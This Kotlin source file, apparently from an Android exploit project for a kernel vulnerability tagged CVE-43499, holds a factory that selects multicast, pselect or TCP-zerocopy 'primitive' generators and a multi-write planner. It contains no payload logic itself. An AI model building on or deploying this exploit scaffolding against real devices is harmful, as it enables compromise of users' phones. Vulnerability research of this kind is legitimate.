package com.ghostlock.app.backend.cve43499.generator

import com.ghostlock.app.backend.cve43499.flow.Cve43499PostPlacementGenerator
import com.ghostlock.app.backend.cve43499.flow.Cve43499WritePlanner
import com.ghostlock.app.data.cve43499.A301SoDebugParameters
import com.ghostlock.app.data.cve43499.DebugExecutionParameters
import com.ghostlock.app.data.cve43499.DebugPrimitiveKind

/**
 * 三路 generator 的唯一工厂（R3b）。
 *
 * 选择源 = debug 配置 `injection.primitive`（单 route，无 fallback）。每种实现都是
 * `(placement facts) -> landing + primitive` 的纯函数；缺参/非法事实由 generator
 * 抛 [Cve43499GeneratorException]（Flow 映射为具名失败）。
 *
 * @note 阶段：R3b；真机未验证，不得据此宣称 supported。
 */
internal object Cve43499RouteGeneratorFactory {
    /**
     * 为本次运行创建 generator。
     *
     * @param debug 已解析的 A301SO debug 参数（含 generator 段与 injection 选择）。
     * @param execution debug 注入执行参数（Placement/Actor/Landing/multicast 执行值）。
     * @param ghostPid 本进程 pid（multicast D3 ghost disarm 使用；必须 >0）。
     * @return 对应 route 的 post-placement generator。
     * @throws Cve43499GeneratorException ghostPid 非法（其余参数在解析期已 fail-closed）。
     */
    fun create(
        debug: A301SoDebugParameters,
        execution: DebugExecutionParameters,
        ghostPid: Int,
    ): Cve43499PostPlacementGenerator {
        if (ghostPid <= 0) {
            throw Cve43499GeneratorException("multicast:ghost-pid")
        }
        val context = Cve43499GeneratorContext(
            debug = debug,
            execution = execution,
            ghostPid = ghostPid,
        )
        return when (debug.injection.primitive) {
            DebugPrimitiveKind.MULTICAST -> Cve43499MulticastInputGenerator(context)
            DebugPrimitiveKind.PSELECT -> Cve43499PselectInputGenerator(context)
            DebugPrimitiveKind.TCP_ZEROCOPY -> Cve43499TcpZerocopyInputGenerator(context)
        }
    }

    /**
     * 为多写链创建写请求规划器（R3d）。
     *
     * @param debug 已解析的 A301SO debug 参数。
     * @param execution debug 注入执行参数。
     * @param ghostPid 本进程 pid（与 generator 同源；规划器本身不使用，只透传上下文）。
     * @return 写请求规划器（target 派生式来自 legacy 目标式）。
     * @throws Cve43499GeneratorException ghostPid 非法。
     */
    fun createPlanner(
        debug: A301SoDebugParameters,
        execution: DebugExecutionParameters,
        ghostPid: Int,
    ): Cve43499WritePlanner {
        if (ghostPid <= 0) {
            throw Cve43499GeneratorException("multicast:ghost-pid")
        }
        return Cve43499DebugWritePlanner(
            Cve43499GeneratorContext(
                debug = debug,
                execution = execution,
                ghostPid = ghostPid,
            ),
        )
    }

    /**
     * @param kind 目标 Primitive 种类。
     * @return 单 route 注入选择的具名 token（日志/证据用）。
     */
    fun token(kind: DebugPrimitiveKind): String = when (kind) {
        DebugPrimitiveKind.MULTICAST -> "multicast"
        DebugPrimitiveKind.PSELECT -> "pselect"
        DebugPrimitiveKind.TCP_ZEROCOPY -> "tcp_zerocopy"
    }
}
